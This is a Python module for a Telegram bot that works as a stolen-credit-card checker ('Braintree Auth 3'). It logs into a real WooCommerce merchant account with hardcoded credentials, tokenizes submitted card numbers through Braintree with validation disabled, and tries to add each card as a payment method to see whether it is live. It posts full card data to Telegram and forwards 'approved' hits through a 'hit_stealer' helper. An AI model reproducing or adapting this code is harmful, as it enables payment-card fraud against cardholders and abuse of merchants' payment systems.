import re
import base64
import json
import time
import asyncio
import aiohttp
import traceback
import csv
import pycountry
from pyrogram import Client, filters
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from BOT.tools.hit_stealer import send_hit_if_approved

def get_bin_info_from_csv(fbin, csv_file='FILES/bins_all.csv'):
    try:
        with open(csv_file, mode='r', encoding='utf-8') as file:
            reader = csv.reader(file)
            for row in reader:
                if row[0] == fbin:
                    return {
                        "bin": row[0],
                        "country": row[1],
                        "flag": row[2],
                        "brand": row[3],
                        "type": row[4],
                        "level": row[5],
                        "bank": row[6]
                    }
    except Exception as e:
        print(f"Error reading CSV: {e}")
    return {}

def get_country_name(code, fallback_country_name):
    try:
        country = pycountry.countries.get(alpha_2=code)
        return country.name if country else fallback_country_name
    except Exception as e:
        print(f"Error getting country name: {e}")
        return fallback_country_name

async def get_bin_details(bin_prefix: str) -> dict:
    bin_info = get_bin_info_from_csv(bin_prefix)
    if not bin_info:
        return {}
    country_code = bin_info.get("country", "N/A").upper()
    country_full = get_country_name(country_code, country_code)
    bin_info['country'] = country_full  # Override with full name
    return bin_info

async def ali1(session: aiohttp.ClientSession, n: str, mm: str, yy: str, cvc: str) -> dict:
    headers = {
        'authority': 'my.restrictcontentpro.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'referer': 'https://my.restrictcontentpro.com/my-account/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    url_login = 'https://my.restrictcontentpro.com/my-account/'

    async with session.get(url_login, headers=headers) as resp:
        text = await resp.text()
        print(f"DEBUG GET {url_login} status={resp.status}")
        match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', text)
        if not match:
            print("Error: 'woocommerce-login-nonce' not found in login page")
            return {"status": "ERROR", "text": "Failed to get login nonce", "bin": n[:6]}
        login_nonce = match.group(1)

    data_login = {
        'username': 'faolmj@telegmail.com',
        'password': 'karar1111/3/',
        'woocommerce-login-nonce': login_nonce,
        '_wp_http_referer': '/my-account/',
        'login': 'Log in',
    }
    headers_post = {**headers, 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://my.restrictcontentpro.com'}

    async with session.post(url_login, headers=headers_post, data=data_login) as resp:
        text_post = await resp.text()
        print(f"DEBUG POST {url_login} status={resp.status}")
        # Optionally check for successful login here

    url_add_payment = 'https://my.restrictcontentpro.com/my-account/add-payment-method/'
    headers_get_add = {**headers, 'referer': 'https://my.restrictcontentpro.com/my-account/payment-methods/'}
    async with session.get(url_add_payment, headers=headers_get_add) as resp:
        text = await resp.text()
        print(f"DEBUG GET {url_add_payment} status={resp.status}")
        match_add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', text)
        if not match_add_nonce:
            print("Error: 'woocommerce-add-payment-method-nonce' not found")
            return {"status": "ERROR", "text": "Failed to get add payment nonce", "bin": n[:6]}
        add_nonce = match_add_nonce.group(1)

        match_client_token = re.search(r'client_token_nonce":"([^"]+)"', text)
        if not match_client_token:
            print("Error: 'client_token_nonce' not found")
            return {"status": "ERROR", "text": "Failed to get client token nonce", "bin": n[:6]}
        client_token_nonce = match_client_token.group(1)

    data_client_token = {
        'action': 'wc_braintree_credit_card_get_client_token',
        'nonce': client_token_nonce,
    }
    headers_ajax = {**headers_post, 'x-requested-with': 'XMLHttpRequest'}
    url_admin_ajax = 'https://my.restrictcontentpro.com/wp/wp-admin/admin-ajax.php'

    async with session.post(url_admin_ajax, headers=headers_ajax, data=data_client_token) as resp:
        json_resp = await resp.json()
        print(f"DEBUG POST {url_admin_ajax} status={resp.status}")
        try:
            enc = json_resp['data']
            decoded = base64.b64decode(enc).decode('utf-8')
            auth_fingerprint_match = re.findall(r'"authorizationFingerprint":"(.*?)"', decoded)
            if not auth_fingerprint_match:
                print("Error: 'authorizationFingerprint' not found")
                return {"status": "ERROR", "text": "Failed to get authorization fingerprint", "bin": n[:6]}
            auth_fingerprint = auth_fingerprint_match[0]
        except Exception as e:
            print(f"Error decoding auth fingerprint: {e}")
            return {"status": "ERROR", "text": "Failed to decode auth fingerprint", "bin": n[:6]}

    headers_tokenize = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': f'Bearer {auth_fingerprint}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': headers['user-agent'],
    }

    json_tokenize = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'custom',
            'sessionId': 'c90eda01-3831-456c-98c7-d170b8035586',
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {'validate': False},
            }
        },
        'operationName': 'TokenizeCreditCard',
    }

    url_graphql = 'https://payments.braintree-api.com/graphql'
    async with session.post(url_graphql, headers=headers_tokenize, json=json_tokenize) as resp:
        json_tok = await resp.json()
        print(f"DEBUG POST {url_graphql} status={resp.status}")
        try:
            tok = json_tok['data']['tokenizeCreditCard']['token']
        except Exception:
            return {"status": "ERROR", "text": "Failed to tokenize card", "bin": n[:6]}

    headers_checkout = {
        'authority': 'my.restrictcontentpro.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://my.restrictcontentpro.com',
        'referer': 'https://my.restrictcontentpro.com/my-account/add-payment-method/',
        'user-agent': headers['user-agent'],
    }

    data_checkout = [
        ('payment_method', 'braintree_credit_card'),
        ('wc-braintree-credit-card-card-type', 'master-card'),
        ('wc-braintree-credit-card-3d-secure-enabled', ''),
        ('wc-braintree-credit-card-3d-secure-verified', ''),
        ('wc-braintree-credit-card-3d-secure-order-total', '0.00'),
        ('wc_braintree_credit_card_payment_nonce', tok),
        ('wc_braintree_device_data', '{"correlation_id":"222412efc0b61b3999d1c0cc5f374f71"}'),
        ('wc-braintree-credit-card-tokenize-payment-method', 'true'),
        ('woocommerce-add-payment-method-nonce', add_nonce),
        ('_wp_http_referer', '/my-account/add-payment-method/'),
        ('woocommerce_add_payment_method', '1'),
    ]

    async with session.post(url_add_payment, headers=headers_checkout, data=data_checkout) as resp:
        text = await resp.text()
        print(f"DEBUG POST {url_add_payment} status={resp.status}")
    
    match = re.search(r'Status code\s*(.+?)<', text)
    if match:
        result = match.group(1)
    else:
        if 'Payment method successfully added.' in text or 'Nice! New payment method added' in text:
            return {"status": "APPROVED", "text": "APPROVED ✅", "bin": n[:6]}
        elif 'risk_threshold' in text:
            return {"status": "RISK_THRESHOLD", "text": "risk_threshold", "bin": n[:6]}
        elif 'Please wait for 20 seconds.' in text:
            return {"status": "RETRY", "text": "try again", "bin": n[:6]}
        else:
            return {"status": "DECLINED", "text": "DECLINED ❌", "bin": n[:6]}

    if any(word in result.lower() for word in ['avs', 'approved', 'insufficient funds', 'successfully', 'changed', 'duplicate']):
        return {"status": "APPROVED", "text": "APPROVED ✅", "bin": n[:6]}
    else:
        return {"status": "DECLINED", "text": f"{result} ❌", "bin": n[:6]}

async def btc_check(card_input: str, message=None) -> dict:
    try:
        n, mm, yy, cvc = card_input.strip().split('|')
        yy = yy[-2:]
        start_time = time.perf_counter()
        async with aiohttp.ClientSession() as session:
            result = await ali1(session, n, mm, yy, cvc)
            bin_info = await get_bin_details(n[:6])
            result['bin_info'] = bin_info
            result['start_time'] = start_time
            result['message'] = message
            result['proxy_status'] = "No Proxy"
            await asyncio.sleep(22)
            return result
    except Exception as e:
        return {"status": "ERROR", "text": f"Error: {str(e)}", "bin": card_input[:6] if len(card_input) >= 6 else "Unknown"}

def build_card_message(
    fullcc: str,
    response: str,
    gateway: str,
    bin6: str,
    country: str,
    flag: str,
    bank: str,
    brand: str,
    type_: str,
    level: str,
    start: float,
    proxy_status: str,
    message,
    role: str,
    status: str
) -> str:
    elapsed = time.perf_counter() - start
    user_name = getattr(message.from_user, 'first_name', 'User ') if message else 'User '
    user_id = getattr(message.from_user, 'id', 0) if message else 0
    return (f"{status}\n"
        "━━━━━━━━━━━━━\n"
        f"[⟐] 𝗖𝗖 - <code>{fullcc}</code>\n"
        f"[⟐] 𝗦𝘁𝗮𝘁𝘂𝘀 : {response}\n"
        f"[⟐] 𝗚𝗮𝘁𝗲 - {gateway}\n"
        "━━━━━━━━━━━━━\n"
        "━━━━━━━━━━━━━\n"
        f"[⟐] B𝗶𝗻 : {bin6}\n"
        f"[⟐] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country} {flag}\n"
        f"[⟐] 𝗜𝘀𝘀𝘂𝗲𝗿 : {bank}\n"
        f"[⟐] 𝗧𝘆𝗽𝗲 : {brand} | {type_} - {level}\n"
        "━━━━━━━━━━━━━\n"
        f"[⟐] T/t : {elapsed:0.2f}s | Proxy : Live ✨\n"
        f"[⟐] 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗯𝘆: <a href='tg://user?id={user_id}'>{user_name}</a> [ {role} ]\n"
        f"[⟐] 𝗢𝘄𝗻𝗲𝗿: <a href=\"tg://user?id=8340881349\">𝑺𝑷𝑰𝑫𝑬𝑹</a>\n"
        "╚═════⟐「 𝐂𝐇𝐀𝐑𝐆𝐄 𝐌𝐀𝐒𝐓𝐄𝐑  」⟐═════╝"
    )

@Client.on_message(filters.command("brrrrrr", [".", "/"]))
async def ali1_cmd(Client, message):
    user_id = str(message.from_user.id)
    try:
        checkall = await check_all_thing(Client, message)
        gateway = "Braintree Auth 3 💎"
        if not checkall[0]:
            return

        role = checkall[1]
        getcc = await getmessage(message)
        if getcc is False:
            resp = f"""Gate Name: {gateway} ♻️
CMD: /br

Message: No CC Found in your input ❌

Usage: /br cc|mes|ano|cvv"""
            await message.reply_text(resp, message.id)
            return

        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"
        bin6 = cc[:6]

        firstresp = f"""
↯ Checking.

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> 
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
</b>
"""
        firstchk = await message.reply_text(firstresp)
        await asyncio.sleep(0.5)

        secondresp = f"""
↯ Checking..

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> 
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■□
- Proxy : Live ✨
"""
        await asyncio.sleep(0.5)
        secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)

        # Run the check (includes ali1, lookup_bin, sleep(22))
        result = await btc_check(fullcc, message=message)

        # Normalize status for top line (add emojis) - Keep RISK_THRESHOLD as DECLINED for now, or customize if needed
        status_raw = result.get("status", "ERROR")
        if status_raw == "APPROVED":
            status_display = "APPROVED✅"
        elif status_raw == "RISK_THRESHOLD":
            status_display = "RISK_THRESHOLD ⚠️"  # Customized for risk_threshold to differentiate
        elif status_raw in ["RETRY", "ERROR"]:
            status_display = "DECLINED❌"
        else:
            status_display = "DECLINED❌"

        # Extract BIN info from result (now using CSV-based with full country)
        bin_info = result.get('bin_info', {})
        country = bin_info.get('country', 'Unknown')
        flag = bin_info.get('flag', '')
        bank = bin_info.get('bank', 'Unknown')
        brand = bin_info.get('brand', 'Unknown')
        type_ = bin_info.get('type', 'Unknown')
        level = bin_info.get('level', 'Unknown')

        # Build the exact formatted message
        response_message = build_card_message(
            fullcc=fullcc,
            response=result["text"],
            gateway=gateway,
            bin6=bin6,
            country=country,
            flag=flag,
            bank=bank,
            brand=brand,
            type_=type_,
            level=level,
            start=result.get('start_time', time.perf_counter()),
            proxy_status=result.get('proxy_status', 'No Proxy'),
            message=message,
            role=role,
            status=status_display  # Use normalized with emojis for top line
        )

        thirdresp = f"""
↯ Checking...

- 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> 
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■■■■
- Proxy : Live ✨
"""
        await asyncio.sleep(0.5)
        thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)

        # Send final response (plain text)
        await Client.edit_message_text(message.chat.id, secondchk.id, response_message)

        # Hit stealer if approved
        if status_raw.lower() == "approved":
            await send_hit_if_approved(Client, response_message)

    except Exception as e:
        print(f"[ali1_cmd ERROR] {traceback.format_exc()}")
        errorresp = f"""Gate Name: {gateway} ♻️

Error: Internal bot error occurred."""
        await message.reply_text(errorresp)
